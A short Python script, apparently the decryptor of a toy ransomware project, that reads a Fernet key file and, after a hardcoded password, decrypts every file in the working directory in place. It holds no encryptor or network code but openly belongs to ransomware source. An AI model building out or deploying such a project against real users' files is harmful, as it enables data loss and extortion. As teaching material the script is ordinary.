import os
from cryptography.fernet import Fernet


#find files

files = []

for file in os.listdir():

	if file == "ransomware.py" or  file == "thekey.key" or file == "decrypt.py" or file == "README.md":
		continue
	if  os.path.isfile(file):
		files.append(file)



print(files)

with open("thekey.key", "rb") as key:
	secretkey = key.read()

secretphrase = "unlock"

user_phrase = input("Enter password to decrypt files:\n")

if user_phrase == secretphrase:

	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
	print("Your files have been restored.")
else:
	print("Incorrect pasword.")
